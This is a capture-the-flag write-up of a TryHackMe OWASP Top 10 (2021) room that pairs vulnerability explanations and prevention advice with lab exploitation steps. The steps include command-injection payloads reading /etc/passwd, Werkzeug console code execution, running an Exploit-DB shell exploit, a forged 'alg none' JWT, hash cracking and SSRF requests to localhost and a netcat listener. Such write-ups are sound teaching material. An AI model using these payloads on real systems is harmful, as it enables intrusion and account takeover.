---
title: OWASP Top 10 - 2021
desc: >-
  THM: Learn about and exploit each of the OWASP Top 10 vulnerabilities; the 10
  most critical web security risks.
---
## Task 1 - Introduction
This room covers topics related to OWASP Top 10 vulnerabilities (updated 2021). The material covered includes details on the vulnerabilities, how they occur, and methodologies to exploit them. Specific topics covered are as follows:
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging & Monitoring Failures
10. Server-Side Request Forgery (SSRF)

Additional information regarding OWASP Top 10 project can be found at [OWASP Top 10](https://owasp.org/www-project-top-ten/).

## Task 2 - Accessing Machines
This task contains instructions on accessing target vulnerable machines required for the remainder of the tasks.

## Task 3 - Broken Access Control
Access control is intended to enforce policy such that users cannot act outside their intended permissions. Broken access control allows attackers to bypass authorization, allowing them to view, modify, or delete sensitive data or perform tasks which should be restricted to them.

Common access control vulnerabilities include:
- Violation of the principle of least privilege or deny by default. Access should only be granted for particular capabilities, roles, or users.
- Bypass of access control checks and measures by modifying the URL (parameter tampering or force browsing) or HTML page, internal application state, or by modifying API requests.
- Permitting viewing or editing of other users' account by providing its unique identifier (IDOR).
- Accessing APIs with missing access controls for POST, PUT and DELETE.
- Allow low-privileged user to act as admin or higher privileged user without being logged in (privilege escalation).
- Metadata manipulation such as replaying or tampering with JSON Web Tokens (JWT).
- Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user.

The following are several methods which could be employed to prevent vulnerabilities arising from broken access control:
- Deny resources by default.
- Implement access control mechanisms once. These mechanisms should be reused throughout the application.
- Minimize Cross-Origin Resource Sharing (CORS) usage.
- Enforce record ownership rather than accepting that the user can create, read, update, or delete any record.
- Enforce unique application business limit requirements via domain models.
- Disable web server directory listing and ensure file metadata and backup files are not present within web root.
- Log access control failures and alert admins when appropriate.
- Rate limit API and controller access to minimize harm from automated attacks.
- Stateful session identifiers should be invalidated on the server after logout. For example, JWT should be short-lived to minimize the attack window. If longer-lived JWT is required, follow the OAUTH standards to revoke access.
  
## Task 4 - Broken Access Control (IDOR Challenge)
Insecure Direct Object Reference (IDOR) is a type of an access control vulnerability that allows a user to access resources they wouldn't normally be able to see via the use of a unique identifier without authorization checks.

These types of vulnerabilities typically occur when a developer exposes a direct object reference (ie: a unique identifier) that is associated with a specific resource or object within the server.

Let's look at a simple example. The task provides us with a simple web application which, after correctly authenticating ourselves, we are presented with a list of things we need to buy from a store.

![IDOR User Account](../../assets/images/thm/owasptop10_2021/01-idor_user.png)

If we look at the URL, we notice that application exposes the direct object reference through the *note_id* parameter which points to specific accounts.

![IDOR id Parameter](../../assets/images/thm/owasptop10_2021/02-idor_id.png)

By altering the *note_id* parameter, we are able to access information from other accounts. This is due to the web application not checking if the logged-in user owns or has permissions to access the referenced account.

By modifying the *note_id* parameter to have the value `0` (ie: `note_id=0`), we can access the admin's account which contains the flag needed for this task.

![IDOR Flag](../../assets/images/thm/owasptop10_2021/03-idor_flag.png)

Note that direct object references aren't necessarily a problem in themselves but rather issues arise from lack of authentication and validation controls implemented by developers.

## Task 5 - Cryptographic Failures
A cryptographic failure refers to any vulnerability arising from the misuse (or lack of use) of cryptographic algorithms for protecting sensitive information. Cryptographic failures often result in web applications accidentally divulging sensitive data.

#### Prevention Methodology
The following are several methods which could be employed to prevent vulnerabilities arising from cryptographic failures:
- Classify data processed, stored, or transmitted by an application in terms of sensitivity as required by privacy laws, regulatory requirements, or business needs.
- Do not store sensitive data unnecessarily.
- Encrypt all sensitive data at rest.
- Ensure up-to-date and strong standard algorithms, protocols, and keys are in place with proper key management implementation.
- Encrypt all data in transit with secure protocols.
- Disable caching for response that contain sensitive data.
- Apply required security controls as per the data classification.
- Do not use legacy protocols such as FTP and SMTP for transporting sensitive data.
- Store passwords using strong adaptive and salted hashing functions.
- Always use authenticated encryption instead of just encryption.

## Task 6 - Cryptographic Failures (Supporting Material 1)
The most common way to store a large amount of data in a format easily accessible from many locations is in a database. Database engines usually follow the Structured Query Language (SQL) syntax.

In a production environment, it is common to have databases set up on dedicated servers running a database service such as MySQL or MariaDB. It is also possible that databases can be stored as files (or flat-file databases) on a local hard-disk. Flat-file databases are much easier than setting up an entire database server. The most common (and simplest) format of a flat-file database is an SQLite database.

In our scenario, the developer has stored an SQLite flat-file database in the root directory of the website. As a result, we are able to download and query the database file on our local machine with full access to everything in the database. Before we look at the challenge in subsequent tasks, let's review the syntax required to query an SQLite database. For our purposes, we will be using a utility called *sqlite3*.

To access an SQLite database, we would use the `sqlite3 <database-name>` command. 

We can then list the tables in the database using the `.tables` command.

We can get column in the table by using the `PRAGMA table_info(<table-name>);` command.

Finally, we can dump the data from the table using the `SELECT * FROM <table-name>;` command.

## Task 7 - Cryptographic Failures (Supporting Material 2)
Sensitive data in databases is often stored as hashes. Hashes can be easily cracked if the developer uses a weak hashing algorithm. There are many tools which could be employed to crack hashes such as *John the Ripper* or *Hashcat* but for weak and vulnerable hashes such as MD5 hashes, we can use an online tool called [Crackstation](https://crackstation.net/).

## Task 8 - Cryptographic Failure (Challenge)
Let's put what we have learned so far into practice.

Navigating the the provided website and looking at the source-page, we find the existence of an `/assets` directory.

![Asset Directory](../../assets/images/thm/owasptop10_2021/04-crypto_dir.png)

Navigating to the directory, we find the *webapp.db* database file which we can download.

![Download Database File](../../assets/images/thm/owasptop10_2021/06-crypto_download.png)

Using the *file* command, we can verify that the file is an SQLite database type.

![File](../../assets/images/thm/owasptop10_2021/07-crypto_file.png)

We can access the SQLite database file using the *sqlite3* utility and enumerate the tables and columns.

![Database Enumeration](../../assets/images/thm/owasptop10_2021/08-crypto_enum.png)

Let's dump all the data contained in the *users* table.

![Data Dump](../../assets/images/thm/owasptop10_2021/09-crypto_dump.png)

We can see a row for the admin user in the data dump above `admin:6eea9b7ef19179a06954edd0f6c05ceb`.

Using *Crackstation* to crack the admin user's hash we find the password: `admin:qwertyuiop`

![Admin Password](../../assets/images/thm/owasptop10_2021/10-Crypto_pass.png)

Using the credentials above, we can log-in as the admin user and retrieve the flag from the website.

![Crytpo Flag](../../assets/images/thm/owasptop10_2021/11-crypto_flag.png)

## Task 9 - Injection
Injection flaws are some of the most common vulnerabilities in applications today. Injection vulnerabilities occur when the application interprets user-controlled input as a valid command or parameter. Injection attacks depend on the underlying technology implemented in the application. SQL Injection (SQLi) and Command Injection are the two most common examples.
- **SQL Injection** occurs when user-controlled input is passed to SQL queries. Without input sanitation, an attacker can pass in SQL queries to manipulate the output of such queries.
- **Command Injection** occurs when user input is passed to system commands. An attacker can execute arbitrary system commands on application servers, potentially allowing them to access sensitive data.

An application is vulnerable to injection attack when:
- User-supplied data is not validated, filtered, or sanitized by the application.
- Dynamic queries or non-parameterized calls without context-aware escaping are used directly in the interpreter.
- Hostile data is used within object-relational mapping (ORM) search parameters to extract additional, sensitive records.
- Hostile data is directly used or concatenated.

Preventing injection requires keeping data separate from commands and queries:
- The preferred option is to use safe API which avoids using the interpreter entirely.
- Use positive server-side input validation.
- For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter.
- Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection.

## Task 10 - Command Injection
Command injection occurs when server-side code (such as PHP) in a web application makes a call to a function that interacts with the server's console directly. An injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server.

#### Code Example
Consider a scenario where a company (MooCorp) has started developing a web-based application for cow ASCII art with customizable text. The developers utilized the *cowsay* utility in Linux with a code wrapper calls the utility from the operating system's console and sends back its contents to the website. Let's look at the code used for this app.

```php
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
```
The above snippet of code does the following:
1. Check if the parameter "mooing" is set. If it is, the variable `$mooing` gets assigned the value of what was passed into the input field.
2. Check if the parameter "cow" is set. If it is, the variable `$cow` gets what was passed through the parameter.
3. The program executes the function `passthru("perl /usr/bin/cowsay -f $cow $mooing");`. The *passthru* function simply executes a command in the operating system's console and sends the output back to the user's browser. The command is formed by concatenating the `$cow` and `$mooing` variables at the end of it. Since we can manipulate those variables, we can try injecting additional commands by using simple tricks.

#### Exploiting Command Injection
Now that we know how the application works, we can take advantage of a Bash feature called *inline commands* to abuse the *cowsay* server and execute any arbitrary command we want. Bash allows users to run commands within commands. This is useful for many reasons, but in our case, it will be used to inject command within the *cowsay* server to get it executed.

To execute inline commands, we need to enclose them in the following format: `$(your_command_here)`

If the console detects an inline command, it will execute it first and then use the result as the parameter for the outer command. Look at the following example which runs `whoami` as an inline command inside the `echo` command.

![Inline Command](../../assets/images/thm/owasptop10_2021/12-inject_inline.png)

Let's look at the *cowsay* service by navigating to the provided URL. We can begin off by listing all the files in the root directory of the web server using the `$ls -la` command.

![Inject ls](../../assets/images/thm/owasptop10_2021/13-inject_ls.png)

![Inject ls Result](../../assets/images/thm/owasptop10_2021/14-inject_ls_result.png)

We can see that there are zero non-root/non-service/non-daemon users on the system using the `$(cat /etc/passwd)` command and going through all the users configured on the system.

To determine what user the web application is running as, we can use the `$(whoami)` command.

![Inject whoami](../../assets/images/thm/owasptop10_2021/15-inject_whoami.png)

We can determine the default shell `/sbin/nologin` for the *apache* user by looking at the output of `$(cat /etc/passwd)`.

![Default Shell](../../assets/images/thm/owasptop10_2021/16-inject_shell.png)

The Linux version can be determined by looking at the contents of `/etc/os-release`.

![OS Version](../../assets/images/thm/owasptop10_2021/17-inject_ver.png)

## Task 11 - Insecure Design
Insecure design refers to vulnerabilities which are inherent to the application's architecture. These vulnerabilities are not related to bad implementation or configurations but instead the architecture of the application as a whole is flawed. Vulnerabilities related to insecure design often arise due to an improper threat modelling which is made during the planning phase of the application and propagates all the way up to the final application. Other times, vulnerabilities may be introduced due to "shortcuts" used by developers during the coding and testing process.

Since insecure design vulnerabilities are introduced early in the development process, resolving them often requires refactoring/rebuilding the vulnerable part of the application. The best approach to avoiding such vulnerabilities is to perform threat modelling at the early stages of the development cycle. The following are a few tips on prevention:
- Establish and use a secure development lifecycle.
- Establish and use a library of secure design patterns.
- Use threat modelling for critical authentication, access control, and key flows.
- Integrate security language and controls into user stories.
- Integrate plausibility checks at each tier of the application (frontend and backend).
- Write unit and integration tests to validate that all critical flows are resistant to threat model.
- Compile use-cases and misuse-cases for each tier of the application.
- Segregate tier layers on the system and network layers depending on exposure and protection needed.
- Segregate tenants by design throughout all tiers.
- Limit resource consumption by user or service.

Let's look at a practical example provided in this task. We are provided a URL will allows us to log into a user account. We are told that the application has a design flaw in its password reset mechanism. Let's figure out the weakness in the proposed design and abuse it to get our flag.

Let's begin by attempting to reset the user's account password.

![Insecure Design Password Reset](../../assets/images/thm/owasptop10_2021/18-insecure_design_reset.png)

During the password reset stage, we are given a choice of security questions. One of the questions asks us to provide an answer to the user's (*joseph*) favourite colour. We also notice while trying to guess the answer that rate-limiting on failed attempts is not implemented. This means that we can brute-force the answer without getting locked in. Trying different primary colours as an answer we find that the answer *green* successfully resets the user's password (Password reset to: `9B6sDKvcr47fXF`).

![Insecure Design Password Reset Success](../../assets/images/thm/owasptop10_2021/19-insecure_design_success.png)

We can now log into the user account with the credentials `joseph:9B6sDKvcr47fXF` to retrieve the flag.

![Insecure Design Flag](../../assets/images/thm/owasptop10_2021/20-insecure_design_flag.png)

## Task 12 - Security Misconfiguration
Security misconfigurations are distinct from other Top 10 vulnerabilities because they occur due to misconfigured security settings (purposefully or inadvertently). An application may be vulnerable if the application is:
- Missing appropriate security hardening across any part of the application stack or improperly configured permissions on cloud services.
- Unnecessary features are enabled or installed (ie: unnecessary ports, services, pages, accounts, or privileges).
- Default accounts and their passwords are still enabled and unchanged.
- Error handling reveals stack traces or other overly informative error messages to users.
- Latest security features are disabled or not configured securely.
- Not using HTTP security headers.
- The software is out of date or vulnerable.

To prevent vulnerabilities arising from security misconfigurations, secure installation processes should be implemented, including:
- A repeatable hardening process.
- A minimal platform without any unnecessary features, components, documentation, and samples.
- A task to review and update the configurations appropriately.
- Review cloud storage permissions.
- A segmented application architecture providing effective and secure separation.
- Sending security directives to clients (ie: security headers).
- An automated process to verify the effectiveness of the configurations and settings in all environments.

A common security misconfiguration involves the exposure of debugging features in production software. Debugging features are often available in programming frameworks to allow the developer to access advanced functionality that is useful for debugging an application during the development and testing cycle. Let's look at a practical example of a web application running a *Werkzeug* console. Werkzeug is a key component in Python-based web applications as it provides an interface for web servers to execute the Python code. Werkzeug includes a debug console that can be accessed either via URL on `/console` (or if an exception is raised by the application). In both cases, the console provides a Python console that will run any code a user sends to it.

Opening the URL provided by the task and navigating to `/console`, we are presented with a *Werkzeug* console.

![Werkzeug Console](../../assets/images/thm/owasptop10_2021/21-security_misconfig_console.png)

Using the following code, we can get the console to execute system command (command injection) such as `ls -l` to list directory contents:

```python
import os; print(os.popen("ls -l").read())
```
![Security Misconfiguration Command Injection](../../assets/images/thm/owasptop10_2021/22-security_misconfig_ls.png)

We can modify the above code to read the contents of the *app.py* file to retrieve the source code and the flag.

```python
import os; print(os.popen("cat app.py").read())
```
![Security Misconfiguration Flag](../../assets/images/thm/owasptop10_2021/23-security_misconfig_flag.png)

## Task 13 - Vulnerable and Outdated Components
Vulnerable and outdated components are software components that are no longer being supported by the developer (deprecated features, libraries, APIs, etc.). Often times, a component has known vulnerabilities that don't get fixed due to lack of resources. Applications often become vulnerable to attacks because they use outdated software components with known security vulnerabilities.

Some key ways vulnerabilities can appear in applications when using vulnerable or outdated components are as follows:
- If you don't know the versions of all components you use (including nested dependencies).
- If the software is vulnerable, unsupported, or out of date.
- If you do not scan for vulnerabilities regularly and subscribe to security bulletins related the component in use.
- If you do not fix, patch, or upgrade the underlying platform, framework, and dependencies in a risk-based timely manner.
- If software developers do not test the compatibility of updated, upgraded, or patched libraries.
- If you do not secure the components' configurations.

Methods to prevent vulnerabilities arising from outdated components are as follows:
- Remove unused dependencies, unnecessary features, components, files, and documents.
- Continuously inventory the versions of both client-side and server-side components and their dependencies.
- Only obtain components from official sources over secure channels.
- Monitor for libraries and components that are unmaintained or do not create security patches for older versions.

## Task 14 - Vulnerable and Outdated Components - Exploits
Key to determining vulnerabilities in applications is recon and enumeration. Our main job is to find out information on the software and research it until we can find an exploit for any vulnerabilities identified. A good resource for finding exploits is [Exploit-DB](https://www.exploit-db.com/) or automated scripts such as [Linux Exploit Suggester](https://github.com/jondonas/linux-exploit-suggester-2).

## Task 15 - Vulnerable and Outdated Components - Lab
In this task, we will be looking at an example. We are presented with a URL for a vulnerable web application. Clicking on the URL presents us with a CSE bookstore website make using PHP with MySQL.

Looking through the source code, we don't see anything unusual. We do notice that at the there is an *Admin Login* page located at `/admin.php`. Searching for *book store 1.0* on Exploit-DB, we find several exploits.

![CSE Bookstore Exploit-DB](../../assets/images/thm/owasptop10_2021/24-vulnerable_components_exploit.png)

Since the task requires us to find the contents of the `/opt/flag.txt` file, we will require an exploit that does a remote code execution.

![CSE Bookstore RCE Exploit](../../assets/images/thm/owasptop10_2021/25-vulnerable_components_rce.png)

The above exploit creates a shell. Let's download and execute the exploit.

![CSE Bookstore Shell](../../assets/images/thm/owasptop10_2021/26-vulnerable_components_shell.png)

With the shell created, we can now get the contents of the flag from the `/opt/flag.txt` file.

![CSE Bookstore Flag](../../assets/images/thm/owasptop10_2021/27-vulnerable_components_flag.png)

## Task 16 - Identification and Authentication Failures
Authentication and session management makeup core components of modern web applications. Authentication controls allow users to gain access to resources by verifying their identities. The most common method of authentication via the username and password mechanism. In this type of a system, a user will provide their credentials to the server which in turn would verify the user's identity and provide the user's browser with a session cookie. A session cookie is needed because web servers use HTTP(S) to communicate which are stateless in nature. Attacking session cookies means the server will know who is sending what data.

Authentication weaknesses can arise in applications if the application:
- Permits automated attacks such as credential stuffing where the attacker has a list of valid usernames and passwords.
- Permits brute force or other automated attacks.
- Permits default, weak, or well-known passwords.
- Uses weak or ineffective credential recovery and forgot-password processes such as "knowledge-based" answers which cannot be made safe.
- Uses plain text, encrypted, or weakly hashed password data stores.
- Has missing or ineffective multi-factor authentication.
- Exposes session identifier in the URL.
- Reuse session identifier after successful login.
- Does not correctly invalidate Session IDs.

Some methods to prevent weaknesses in authentication systems are:
- Implement multi-factor authentication where possible. This prevents automated credential stuffing, brute force, and stolen credential reuse attacks.
- Do not use any default credentials.
- Implement weak password checks.
- Limit or increasingly delay failed login attempts. Log all failures and alert administrators. 
- Use server-side, secure, built-in session manager that generates a new random session ID with high entropy after login.

## Task 17 - Identification and Authentication Failures Practical
In this example, we will look at logic flaw within an authentication mechanism. We are told that the application is vulnerable to an exploit which allows re-registration of an existing user. Furthermore, we are told that the developer of the application did not implement input sanitization for the username and password fields.

The task provides us with a URL for the vulnerable app and asks us to access the user *darren* account. Since we know that the application is vulnerable to re-registration attacks, we can create a new user account but with an extra space in the front: ` darren` with password `pass123`

![Authentication Failure Re-Registration](../../assets/images/thm/owasptop10_2021/28-auth_account.png)

With our user created successfully, we can now login with the credentials ` darren:pass123`. Note the space in front of our new user. Due to the flawed logic implemented by the authentication verification check on the backend, the server will verify our new user as `darren` instead.

![Authentication Failure Darren's Flag](../../assets/images/thm/owasptop10_2021/29-auth_darren_flag.png)

We are not asked to try the same method with the user *arthur*. Let's register a new user with the credentials ` arthur:pass123`. Note the space in front of the new username. After successful registration, log in and retrieve the flag for the user `arthur`.

![Authentication Failure Arthur's Flag](../../assets/images/thm/owasptop10_2021/30-auth_arthur_flag.png)

## Task 18 - Software and Data Integrity Failures
Software and data integrity failures result from code and infrastructure that do no protect against integrity violations. One of the more common data integrity issues arise in situations when users or applications download updates for existing software. Without having a secure CI/CD pipeline with sufficient integrity verification, it is difficult to be certain that the data wasn't modified in transit or that the data is a malicious copy of the original.

To circumvent these issues, most software distributors provide hashes to check a file's integrity. Users can recalculate hashes for their downloaded files and compare the local hash with the one published by the developer. In Linux, hashes can be calculated as follows:

```console
$ md5sum <file_name>
$ sha1sum <file_name>
$ sha256sum <file_name>
```
There are two types of vulnerabilities in this category:
- Software Integrity Failures
- Data Integrity Failures
  
## Task 19 - Software Integrity Failures
Suppose you develop an website which uses third-party libraries that are stored remotely in some external server that out of your control (ie: jQuery). When a user accesses your website, their browser will read the HTML code and download the third-party library from the specified external source. 

Now consider an attacker who is able to either intercept the download of the library (MTIM) and inject a malicious payload or somehow is able to hack the remote server and replace the original with a malicious copy of the library. Anyone visiting your website would now be accessing the malicious code and execute it in their browsers unknowingly. This is a software integrity failure as the website makes no checks against the third-party library to see if it has changed.

Lucky for us, modern browsers provide the capability to specify a hash along with a library's URL so that the library code is executed only if the hash of the downloaded file matches the expected value. This security mechanism is called [Subresource Integrity (SRI)](https://www.srihash.org/).

## Task 20 - Data Integrity Failures
When a user logs into an application, the server will assign some sort of session token that will need to be saved locally on the user's browser for as long as the server lasts. This token is then repeated on each subsequent web request so that the application knows who is making the requests. The most common way these session tokens are assigned is through the use of cookies. Cookies are key-value pairs that a web application will store on the user's browser and will be automatically repeated on each web request to the website by the user.

Developers often use existing token implementations with one of the more popular recently being the JSON Web Tokens (JWT). JWT are simple tokens that allow storage of key-value pairs on a token that provides integrity as part of the token. A generated token can be shared with the user with the certainty that the end-user would not be able to alter the key-value pairs and still pass the integrity check. The structure of a JWT token is formed of 3 parts:

![Data Integrity JWT](../../assets/images/thm/owasptop10_2021/31-data_integrity_jwt.png)

In the above example, the header portion of the JWT token contains metadata indicating that this is a JWT with a signing algorithm of HS256. The payload contains the key-value pairs with the data that the web application wants the client to store. The signature is similar to a hash. If a user changes the payload, the web application can verify that the signature won't match the payload and know that the JWT has been tampered with. Unlike simple hash, this signature involves the use of a secret key held by the server alone. This means that by simply changing the payload, an attacker won't be able to generate the matching signature unless they know the secret key.

Note that each of the three parts of JWT token are simply plaintext encoded with base64. The signature contains binary data which won't make much sense even after decoding the base64.

#### JWT and the None Algorithm
A while ago, a data integrity failure vulnerability was found in some libraries implementing JWT tokens. The vulnerable libraries allowed attackers to bypass the signature validation by changing the following parameters in a JWT token:
1. Modify the header so that the `alg` parameter contained the value `none`.
2. Remove the signature part.

This permitted attackers, to modify the JWT tokens and bypass signature verification checks. Let's see this in practice.

Navigating to the URL provided and authenticating with the credentials `guest:guest`, we are logged into the web application. After the successful login, we notice in our browser's developer tools that a JWT token has been assigned to us and is stored as a cookie.

![Data Integrity Cookie](../../assets/images/thm/owasptop10_2021/32-data_integrity_cookie.png)

We can copy the JWT token and decode it to see the plaintext header and payload.

```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjg1MTI0NzQ5fQ.mrBUgRYiNh-uV8I_ZVY9CrNu4Q2HYoI_Kj0sKMqVlXM
```
```text
{"typ":"JWT","alg":"HS256"}{"username":"guest","exp":1685124749}	«Hb#a¹_eV=
³ná
b
K
2¥e\
```
Let's modify the token above by modifying the `alg` parameter to have the value `none` and removing the signature part of the token.

```text
{"typ":"JWT","alg":"none"}{"username":"admin","exp":1685124749}
```
We can now re-encode the token as base64. I had to encode the header and payload separately as doing it together did not produce the correct encoded value. Note that the header, payload, and signature fields need to be separated by a `.` in order for it to be interpreted as a valid JWT token.

```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjg1MTI0NzQ5fQ==.
```
Updating the cookie value in our browser with our modified token and doing a hard refresh of the web application (CTRL + R), we are able to bypass authentication check for the *admin* user and retrieve the flag.

![Data Integrity Flag](../../assets/images/thm/owasptop10_2021/34-data_integrity_flag.png)

## Task 21 - Security Logging and Monitoring
Good security practices dictate that when web applications are set up and deployed, every action performed by an end-user should be logged. Logging is helpful when performing incidence response and threat detection as an attackers activities can be traced. Without logging and monitoring, breaches cannot be detected. Typical information stored in logs should include the following:
- HTTP status codes
- Time stamps
- Usernames
- API endpoint/page locations
- IP addresses

As these types of logs have sensitive information, it is important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations. As logging is useful in DFIR situations, analysts need to be on the lookout for common examples of suspicious activities like
- Multiple unauthorized attempts for a particular action.
- Requests from anomalous IP addresses or locations.
- Use of automated tools.
- Common payloads.

All suspicious activities should be rated according to the impact level.

## Task 22 - Server-Side Request Forgery (SSRF)
SSRF vulnerabilities arise when an attacker forces a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. These vulnerabilities are typical for implementations where web applications need to use third-party services.

In general, SSRF can be used for:
- Enumerating internal networks, including IP addresses and ports (even when protected by firewalls and VPNs).
- Abuse trust relationships between servers and gain access to otherwise restricted services.
- Interact with some non-HTTP services to get RCEs.

See the task material on TryHackMe for an in depth example.

Let's look a simple example of SSRF vulnerability. Navigating to the URL provided, we find a simple web application which is vulnerable to SSRF. Exploring the website, we find an admin interface which is only accessible from localhost.

![SSRF Admin Interface](../../assets/images/thm/owasptop10_2021/35-ssrf_admin.png)

Looking at link for the *Download Resume* button, we see that the server parameter points to `secure-filestorage.com`. As the server parameter is exposed to the user, we can employ SSRF to send to request to our machine.

![SSRF Server](../../assets/images/thm/owasptop10_2021/36-ssrf_server.png)

Let's start by setting up *Netcat* listener on port 80 to intercept the request.

```console
nc -lvp 80
```
We can now force the web application to forward the request to our machine by modifying the server and port parameter in the URL.

```text
http://10.10.130.112:8087/download?server=10.13.17.49:80&id=75482342
```
We can retrieve the flag from the captured response.

![SSRF Flag](../../assets/images/thm/owasptop10_2021/37-ssrf_flag.png)

#### Going the Extra Mile
In order to get the flag for the going the extra mile, we need to point the server address to `localhost`. The URL for the download request button is constructed in the following way:

```text
http://10.10.203.80:8087/download?server=secure-file-storage.com:8087&id=75482342
```
The `?` after `/download` denotes a separator and does not form part of the [query string](https://en.wikipedia.org/wiki/Query_string) of the multiple query parameters `server=` and `id`. Note that the multiple query parameters are separated by `&` in the URL. The query string parameters dictate the content to show on the page. In our case, the web application is looking for two strings, *server* and *id*. The web application returns an error if one of the key-value pairs is missing or malformed. We can notice this by putting a random value of `id=test`. The following segment of code is returned as part of the error page:

```python
 file_id = request.args.get('id','')
    server = request.args.get('server','')
    if file_id!='':
        filename = str(int(file_id)) + '.pdf'
        
        response_buf = BytesIO()
        crl = pycurl.Curl()
        crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
        crl.setopt(crl.WRITEDATA, response_buf)
```

Note that the web application is running a Python interpreter in the background.

We can modify the URL to point to `server=localhost:8087/admin`. However this causes the page to hang as the requested resource is not available. The resultant URL in the backend based on the above code would be as follows:

```text
http://localhost:8087/admin/public-docs-k057230990384293/75482342.pdf
```
We can bypass this and access the `/admin` page by using appending `?a=` to our server value. This results in the following URL being formed by the backend code:

```text
http://localhost:8087/admin?a=/public-docs-k057230990384293/id=75482342
```
Our resultant URL query to trigger SSRF is as follows:

```text
http://10.10.203.80:8087/download?server=localhost:8087/admin?a=&id=75482342
```

![SSRF Extra Mile](../../assets/images/thm/owasptop10_2021/38-ssrf_extra_mile.png)